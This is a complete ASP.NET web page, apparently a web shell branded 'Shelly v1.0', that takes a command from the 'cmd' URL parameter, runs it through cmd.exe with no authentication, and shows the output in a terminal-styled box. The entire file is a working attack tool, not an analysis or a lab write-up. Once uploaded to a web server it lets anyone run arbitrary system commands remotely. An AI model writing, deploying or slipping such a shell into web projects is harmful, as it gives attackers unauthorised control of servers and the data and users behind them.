<%@ Page Language="C#" %>
<!DOCTYPE html>
<html>
<head>
    <title>Terminal</title>
    <style>
        body { background-color: #0c0c0c; color: #cccccc; font-family: 'Consolas', monospace; padding: 20px; }
        .banner { color: #00ff00; white-space: pre; margin-bottom: 20px; line-height: 1.2; }
        input[type="text"] { background: #1e1e1e; border: 1px solid #333; color: #fff; padding: 10px; width: 60%; }
        button { padding: 10px 20px; cursor: pointer; background: #333; color: #fff; border: none; }
        .output-box { background: #000; border: 1px solid #444; padding: 15px; margin-top: 20px; white-space: pre-wrap; color: #00ff00; min-height: 100px; }
    </style>
</head>
<body>
    <div class="banner">
<%= @"
  _____ _          _ _        v1.0
 / ____| |        | | |       
| (___ | |__   ___| | |_   _ 
 \___ \| '_ \ / _ \ | | | | |
 ____) | | | |  __/ | | |_| |
|_____/|_| |_|\___|_|_|\__, |
                        __/ |
Written by yovecio18   |___/ 
" %>
    </div>

    <form method="GET">
        <input type="text" name="cmd" placeholder="Enter command..." value="<%= Server.HtmlEncode(Request.QueryString["cmd"]) %>">
        <button type="submit">Execute</button>
    </form>

    <% 
    string cmd = Request.QueryString["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        try {
            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd);
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            System.Diagnostics.Process p = System.Diagnostics.Process.Start(psi);
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
    %>
            <div class="output-box"><%= Server.HtmlEncode(output) %></div>
    <% 
        } catch (Exception ex) {
            Response.Write("<div class='output-box' style='color:red;'>Error: " + Server.HtmlEncode(ex.Message) + "</div>");
        }
    } 
    %>
</body>
</html>